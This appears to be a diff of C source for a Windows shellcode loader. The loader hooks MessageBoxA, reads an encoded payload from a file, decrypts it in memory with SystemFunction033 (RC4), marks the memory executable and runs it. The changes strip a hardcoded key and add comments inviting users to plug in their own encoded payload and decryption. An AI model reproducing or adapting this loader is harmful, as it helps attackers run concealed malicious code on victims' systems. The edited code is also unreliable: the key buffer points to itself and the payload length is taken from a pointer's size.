@@ -40,12 +40,10 @@ int __stdcall Hookedshell(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType
 	int payload_len = 0;
 
 	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
-	char _key[] = "www.osandamalith.com";
-
 
 	//note!
 	//you should replace the inputfile with your own decoded file
-	payload = inputFile("README.txt", payload_len);
+	payload = inputFile("your_encoded_file_path.txt", payload_len);
 
 	// allocate memory buffer for payload as READ-WRITE (no executable)
 	void* runtime = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -58,12 +56,13 @@ int __stdcall Hookedshell(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType
 
 	VirtualProtect(runtime, payload_len, PAGE_EXECUTE_READWRITE, &old_protect);
 
-	key.Buffer = (PUCHAR)(&_key);
+	key.Buffer = (PUCHAR)(&key);
 	key.Length = sizeof key;
 
 	_data.Buffer = (PUCHAR)runtime;
 	_data.Length = sizeof runtime;
 
+	//here ur supposed to use your own decrypt methods
 	SystemFunction033(&_data, &key);
 	
 	((int (*)())runtime)();
@@ -87,7 +86,6 @@ int __stdcall Hookedshell(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType
 //	int i;
 //
 //	RC4_Init(S_box, Key, strlen((char*)Key));
-//	printf("S-box：\n");
 //	for (i = 0; i < 256; ++i) {
 //		printf("%02x", S_box[i]);
 //		if ((i + 1) % 16 == 0) printf("\n");
@@ -108,11 +106,11 @@ int main()
 	FreeConsole();
 	HINSTANCE library = LoadLibraryA("user32.dll");
 
-	// 获取在内存中MessageBox函数的地址
+	// get the MessageBox func addr in the memory 
 	oldAddress = GetProcAddress(library, "MessageBoxA");
 
 	/*
-	* 创建挂钩:
+	* creating the hook
 	*/
 	setHook();
 
